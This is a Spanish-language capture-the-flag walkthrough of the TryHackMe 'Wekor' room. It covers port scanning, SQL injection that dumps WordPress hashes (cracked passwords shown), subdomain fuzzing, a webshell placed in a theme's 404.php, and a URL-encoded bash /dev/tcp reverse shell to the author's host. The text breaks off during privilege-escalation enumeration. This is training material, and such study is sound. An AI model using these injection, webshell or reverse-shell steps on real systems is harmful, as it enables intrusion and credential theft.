## TryHackMe  <> Wekor

![image](https://github.com/Esevka/CTF/assets/139042999/349efd0d-9794-4836-9ee1-99a485f9715d)

Enlace Maquina: https://tryhackme.com/room/wekorra

Enunciado : 
  - Please use the domain : "wekor.thm"
  - Conseguir Flags(user.txt y root.txt)
---

## Escaneo de puertos (NMAP).

-Segun el ttl obtenito (63) a la hora de lanzar un ping a la maquina victima podriamos decir que es una maquina ---> Linux.

    ┌──(root㉿kali)-[~]
    └─# ping 10.10.120.22 -c1                                             
    PING 10.10.120.22 (10.10.120.22) 56(84) bytes of data.
    64 bytes from 10.10.120.22: icmp_seq=1 ttl=63 time=568 ms
    
    --- 10.10.120.22 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 567.559/567.559/567.559/0.000 ms
    
-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/wekor/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.120.22 -vvv -oG open_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-20 06:51 CET
    
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63

-Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/wekor/nmap]
    └─# nmap -p 22,80 -sCV -Pn 10.10.120.22 -vvv -oN info_ports                                                              
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-20 06:53 CET
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
    |   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
    |   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
    
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: POST OPTIONS GET HEAD
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    | http-robots.txt: 9 disallowed entries 
    | /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
    |_/comingreallysoon /interesting
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

-Segun el lauchpad del servicio OpenSSH que tenemos corriendo en el puerto 22.

![image](https://github.com/Esevka/CTF/assets/139042999/e70d53c7-7b2d-49b8-9994-71e67f6ab05f)


## Analizamos la informacion obtenida.

-Por el momento tenemos:

  - Maquina Linux Ubuntu XENIAL(16.04)
  - Puertos 80(Http) y 22 (SSH)

--Puerto 80(HTTP)

  1) Incluimos el dominio 'wekor.thm' en nuestro fichero hosts.

          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/wekor/nmap]
          └─# cat /etc/hosts                              
          127.0.0.1       localhost
          10.10.120.22    wekor.thm

  2) Visualizamos la web en busqueda de informacion y encontramos esto.

      ![image](https://github.com/Esevka/CTF/assets/139042999/ed54338e-091f-4234-a47e-b3a363163874)

  3) Segun la info obtenida con nmap tenemos disponible el fichero robots.txt con una serie de directorios.

          | http-robots.txt: 9 disallowed entries 
          | /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
          |_/comingreallysoon /interesting

      - Visualizamos robots.txt

        ![image](https://github.com/Esevka/CTF/assets/139042999/e3e63b16-364f-42f5-a713-b8f2d89f8051)
    
        NOTA: Esto se utiliza generalmente para evitar que ciertas partes del sitio web sean indexadas por los motores de búsqueda.
        Por otro lado esta configuración no impide que las personas accedan directamente a esas URL si conocen la estructura del sitio. La principal función es guiar a los motores de búsqueda.

      - Intentamos acceder a los directorios del fichero robots.txt, Bingo tenemos un directorio valido.
        
        ![image](https://github.com/Esevka/CTF/assets/139042999/8a6d6d33-e36b-4bf3-91b6-689f2fa386fe)

  4) Accedemos al nuevo directorio encontrado --> /it-next

       Segun el enunciado la web es vulnerable a Sqli por lo que vamos al lio, despues de un rato encontramos el campo vulnerable, se encuentra en el carrito de la compra.

       ![image](https://github.com/Esevka/CTF/assets/139042999/bcc5f2fb-0c9a-4c9d-a306-f0996b2c3e9c)

     - Obtencion de datos mediante SQLI.

       Necesitamos interceptar la conexion con burpsuite para poder crear de una manera mas comoda las sentencias sql.

       Las sentencias sql pueden ir urlencode o no funciona de ambas maneras, hacemos una comprobacion y obtenemos datos.

       ![image](https://github.com/Esevka/CTF/assets/139042999/4a5c3621-426d-46aa-85cb-de13c8945697)

       Info para entender todo el proceso:
       
       [+]https://portswigger.net/web-security/sql-injection/union-attacks
       
       [+]https://dev.mysql.com/doc/refman/8.0/en/information-schema-general-table-reference.html

       - Obtenemos el nombre de las bases de datos disponibles, vamos a intentar sacar los usuario de la BD --> wordpress.
      
         ![image](https://github.com/Esevka/CTF/assets/139042999/fda789a6-03c8-4450-a595-c4693afb8093)

       - Obtenemos el nombre de las tablas de la BD (Wordpress), la tabla que nos interesa --> wp_users
      
         ![image](https://github.com/Esevka/CTF/assets/139042999/5f497c9d-1bd7-4406-989c-44c1dd46ad19)

       - Obtenemos las columnas de la tabla wp_users, nos interesan las columnas(user_login, user_pass)

         ![image](https://github.com/Esevka/CTF/assets/139042999/104f8f87-e673-4d13-853e-9ad73a7d3ec9)

       - Obtenemos los valores de las columnas user_login y user_pass

         ![image](https://github.com/Esevka/CTF/assets/139042999/3dfdff14-e73a-48c3-a7a7-e3c065334dfd)

              Usuarios de WP y password(HASH MD5 worpress)
         
              admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
              wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10
              wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/
              wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/

  5) Crakeamos las passwords con john, creamos un ficheros con estructura usuario:pass.

          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
          └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_pass       
          Using default input encoding: UTF-8
          Loaded 4 password hashes with 4 different salts (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
          Remaining 1 password hash
          Cost 1 (iteration count) is 8192 for all loaded hashes
          Will run 3 OpenMP threads
          Press 'q' or Ctrl-C to abort, almost any other key for status
          0g 0:00:21:37 DONE (2023-11-22 16:30) 0g/s 11050p/s 11050c/s 11050C/s  1looove..*7¡Vamos!
          Session completed. 
      
          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
          └─# john --show hash_pass 
              wp_jeffrey:rockyou
              wp_yura:soccer13
              wp_eagle:xxxxxx

  6) Acabamos de obtener credenciales de acceso a un wordpress, por lo que tendremos que buscar el panel de login.

     - Despues de un buen rato haciendo fuzzing con gobuster en busca de directorios que nos aporten algo de info, no encontramos nada.
       
     - Probamos a realizar un ataque con WFUZZ para encontrar subdominios validos.
    
       NOTA: Anadimos el subdominio a nuestro fichero /etc/hosts.                                                                                          

            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
            └─# wfuzz -u http://wekor.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.wekor.thm" --hw 3 
            ********************************************************
            * Wfuzz 3.1.0 - The Web Fuzzer                         *
            ********************************************************
            
            Target: http://wekor.thm/
            Total requests: 4989
            
            =====================================================================
            ID           Response   Lines    Word       Chars       Payload                                                                                                         
            =====================================================================
            
            000000382:   200        5 L      29 W       143 Ch      "site - site"


     - Vamos al subdominio  --> site.wekor.thm , obtenemos el siguiente mensaje.
    
       - Comenta que por el momento no hay nada aqui pero que en un par de semanas deberian tener un sitio web increible, fuzeamos el sitio a ver si han dejado algun directorio interesante.
       
         ![image](https://github.com/Esevka/CTF/assets/139042999/1f880486-ac11-4796-8b71-644a5dfac9cd)

              ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
              └─# gobuster dir -u http://site.wekor.thm/ -w /usr/share/wordlists/dirb/common.txt -o fuzz_subdominio
              ===============================================================
              Gobuster v3.6
              by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)       
              ===============================================================
              /.hta                 (Status: 403) [Size: 279]
              /.htaccess            (Status: 403) [Size: 279]
              /.htpasswd            (Status: 403) [Size: 279]
              /index.html           (Status: 200) [Size: 143]
              /server-status        (Status: 403) [Size: 279]
              /wordpress            (Status: 301) [Size: 320] [--> http://site.wekor.thm/wordpress/]

       - Cargamos el directorio -->wordpress, encontramos una plantilla wordpress poco trabajada, por lo que deducimos que el panel de login estara en el directorio por defecto --> wp-admin.

          Tras loguearnos con los diferentes usuarios obtenidos anteriormente, el unico que tiene permisos de administrador es el usuario --> wp_yura:soccer13

## Obtenemos Shell mediante Wordpress(RCE).

- Una vez logueados, editamos el fichero 404.php con el siguiente codigo php.

  ![image](https://github.com/Esevka/CTF/assets/139042999/b41b8a01-da26-4447-97aa-8c37fe44ba13)

- Ejecutamos comando a traves de la URL.

  ![image](https://github.com/Esevka/CTF/assets/139042999/7e1ae089-9610-424c-b811-1feb5dca1f54)

- Obtenemos Shell.

  Nos ponemos en escucha y ejecutamos la reverse shell desde la URL
    
      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
      └─# rlwrap nc -lnvp 1988
      listening on [any] 1988 ...
  
      ---
      http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php/?cmd=bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.92.151%2F1988%200%3E%261%27
      ---
  
      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
      └─# rlwrap nc -lnvp 1988
      listening on [any] 1988 ...
      connect to [10.9.92.151] from (UNKNOWN) [10.10.122.78] 48462
      bash: cannot set terminal process group (1093): Inappropriate ioctl for device
      bash: no job control in this shell
      <r.thm/wordpress/wp-content/themes/twentytwentyone$
      id
      uid=33(www-data) gid=33(www-data) groups=33(www-data)

  Proceso:Upgrade shell

  ![image](https://github.com/Esevka/CTF/assets/139042999/3bc5c76e-96c5-40d2-a879-c8529df725dc)

## Escalada Horizontal de privilegios www-data to Orka

- Despues de un rato enumerando,con la ayuda de netstat encontramos que la maquina victima tiene varios servicios a la escucha en la direccion local(127.0.0.1-Localhost)

      www-data@osboxes:/home$ netstat -tunlp
      netstat -tunlp
      (Not all processes could be identified, non-owned process info
       will not be shown, you would have to be root to see it all.)
      Active Internet connections (only servers)
      Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
      tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
      tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
      tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -   ----> ESTE ES EL QUE NOS INTERESA ESTA CORRIENDO --> Memcached            
      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
      tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -        
        
         
           
        


       


    
       

       
         
      
         

       



       

     






    
                          

  


